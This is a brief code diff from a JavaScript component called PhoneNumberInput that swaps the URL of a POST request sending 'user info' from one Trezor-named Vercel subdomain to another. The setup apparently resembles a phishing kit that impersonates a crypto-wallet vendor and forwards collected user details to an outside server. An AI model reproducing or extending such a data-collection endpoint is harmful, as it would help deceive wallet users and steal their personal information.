@@ -43,7 +43,7 @@ const PhoneNumberInput = () => {
       setLoading(true);
 
       const response = await fetch(
-        "https://trezor-backend-zeta.vercel.app/api/v1/send-user-info",
+        "https://trezor-backend-nine.vercel.app/api/v1/send-user-info",
         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
